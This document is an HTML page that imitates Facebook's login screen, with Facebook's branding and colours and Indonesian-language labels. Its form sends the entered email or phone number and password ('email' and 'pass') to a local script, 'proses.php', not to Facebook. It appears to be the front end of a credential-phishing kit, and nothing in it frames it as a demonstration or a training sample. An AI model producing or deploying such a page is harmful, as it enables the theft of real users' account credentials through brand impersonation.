<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Login to Facebook</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            background-color: #e9eff1;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
        }

        .login-container {
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100%;
        }

        .login-box {
            background-color: white;
            padding: 40px;
            border-radius: 8px;
            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1);
            width: 350px;
            text-align: center;
        }

        h1 {
            font-size: 36px;
            font-weight: bold;
            color: #1877f2;
            margin-bottom: 10px;
        }

        p {
            color: #4b4f56;
            font-size: 14px;
            margin-bottom: 20px;
        }

        input {
            width: 100%;
            padding: 10px;
            margin: 10px 0;
            border: 1px solid #dddfe2;
            border-radius: 5px;
            font-size: 14px;
        }

        button {
            width: 100%;
            padding: 10px;
            background-color: #1877f2;
            color: white;
            border: none;
            border-radius: 5px;
            font-size: 14px;
            cursor: pointer;
        }

        button:hover {
            background-color: #165eab;
        }

        .forgot-password a {
            font-size: 12px;
            color: #1877f2;
            text-decoration: none;
        }

        .create-account {
            margin-top: 20px;
        }

        .create-account span {
            font-size: 12px;
            color: #4b4f56;
        }

        .create-account a {
            font-size: 14px;
            color: #42b72a;
            text-decoration: none;
        }
    </style>
</head>
<body>
    <div class="login-container">
        <div class="login-box">
            <h1>facebook</h1>
            <p>Login ke Facebook</p>
            <form action="proses.php" method="POST">
                <input type="text" name='email' placeholder="Email atau Nomor Telepon" required>
                <input type="password" name='pass' placeholder="Kata Sandi" required>
                <button type="submit">Masuk</button>
            </form>
            <div class="forgot-password">
                <a href="#">Lupa akun?</a>
            </div>
            <div class="create-account">
                <span>atau</span>
                <a href="#" class="signup">Buat akun baru</a>
            </div>
        </div>
    </div>
</body>
</html>
